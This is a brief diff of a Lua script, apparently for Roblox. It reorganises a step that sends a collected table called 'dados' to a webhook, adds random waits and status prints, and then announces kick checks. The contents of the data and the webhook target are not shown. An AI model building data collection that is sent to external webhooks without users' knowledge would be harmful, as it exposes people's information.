@@ -97,6 +97,16 @@ local dados = {
 for k, v in pairs(dados) do
     print(k .. ": " .. tostring(v))
 end
+
 print("")
+
+print("indo para Webhook..")
+task.wait(math.random())
+webhook(dados)
+task.wait(math.random())
+print("Webhook Enviado!")
+print("")
+print("Fazendo Verificações de Kick!")
+
 --  
-webhook(dados) 
+ 
